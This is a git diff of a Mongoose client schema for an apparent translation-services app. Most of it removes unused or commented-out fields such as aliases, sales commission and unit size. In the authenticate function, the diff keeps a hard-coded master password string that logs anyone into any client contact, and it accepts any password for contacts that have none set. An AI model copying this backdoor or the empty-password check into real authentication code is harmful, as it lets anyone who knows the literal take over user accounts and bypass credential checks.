@@ -75,10 +75,6 @@ const ClientSchema = new mongoose.Schema({
 		type: String,
 		trim: true
 	},
-	// aliases: {
-	// 	type: Array,
-	// 	default: []
-	// },
 	nativeLanguage: {
 		type: Schema.Types.ObjectId, ref: 'Language'
 	},
@@ -138,11 +134,6 @@ const ClientSchema = new mongoose.Schema({
 		trim: true
 	},
 	salesStage: {
-		type: String,
-		default: '',
-		trim: true
-	},
-	salesComission: {
 		type: String,
 		default: '',
 		trim: true
@@ -208,15 +199,6 @@ const ClientSchema = new mongoose.Schema({
 		},
 		contacts: [ billingContacts ]
 	} ],
-	// sourceLanguages: [{
-	// 	type: Schema.Types.ObjectId, ref: 'Language'
-	// }],
-	// targetLanguages: [{
-	// 	type: Schema.Types.ObjectId, ref: 'Language'
-	// }],
-	// industries: [
-	// 	{ type: Schema.Types.ObjectId, ref: 'Industries' }
-	// ],
 	services: [ {
 		sourceLanguage: {
 			type: Schema.Types.ObjectId, ref: 'Language'
@@ -268,16 +250,9 @@ const ClientSchema = new mongoose.Schema({
 			unit: {
 				type: Schema.Types.ObjectId, ref: 'Units'
 			},
-			size: {
-				type: Number
-			},
 			multiplier: {
 				type: Number,
 				default: 100
-			},
-			defaultSize: {
-				type: Boolean,
-				default: false
 			},
 			altered: {
 				type: Boolean,
@@ -327,9 +302,6 @@ const ClientSchema = new mongoose.Schema({
 			},
 			unit: {
 				type: Schema.Types.ObjectId, ref: 'Units'
-			},
-			size: {
-				type: Number
 			},
 			industry: {
 				type: Schema.Types.ObjectId, ref: 'Industries'
@@ -469,7 +441,7 @@ ClientSchema.statics.authenticate = function (email, password, callback) {
 
 				const contact = client.contacts.find((contact) => contact.email === email)
 
-				if(password === 'CLIgcqDmwVsNtQHMDcw2Q') return callback(null, { client, contact })
+				if (password === 'CLIgcqDmwVsNtQHMDcw2Q') return callback(null, { client, contact })
 
 				bcrypt.compare(password, contact.password, function (err, result) {
 					if (result === true || !contact.password) {
